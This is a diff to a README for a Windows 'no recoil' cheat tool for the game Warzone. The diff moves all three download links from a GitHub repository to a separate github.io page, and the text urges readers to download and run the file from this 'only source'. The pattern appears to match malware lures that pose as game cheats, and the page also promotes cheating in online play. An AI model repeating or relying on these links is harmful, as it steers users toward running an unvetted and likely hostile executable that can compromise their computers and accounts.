@@ -1,6 +1,6 @@
 # 🎯 warzone-no-recoil-2026 - Zero Recoil, Total Dominance
 
-[![Download Now](https://img.shields.io/badge/Download-Warzone_No_Recoil_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rayyanazwar0/warzone-no-recoil-2026)
+[![Download Now](https://img.shields.io/badge/Download-Warzone_No_Recoil_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://rayyanazwar0.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these simple steps to get the tool running on your Windows PC. If you can
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/rayyanazwar0/warzone-no-recoil-2026](https://github.com/rayyanazwar0/warzone-no-recoil-2026)
+Visit this link to download the application: [https://rayyanazwar0.github.io](https://rayyanazwar0.github.io)
 
 The download button is clearly visible on that page. Click it and save the file to your computer. This is the official and only source you need.
 
@@ -162,7 +162,7 @@ Don't lose another gunfight to recoil. Download the tool today and experience wh
 
 Need the link one more time? Here it is:
 
-[**https://github.com/rayyanazwar0/warzone-no-recoil-2026**](https://github.com/rayyanazwar0/warzone-no-recoil-2026)
+[**https://rayyanazwar0.github.io**](https://rayyanazwar0.github.io)
 
 Visit this link to download the application. Click the download button, run the file, and start winning.
 
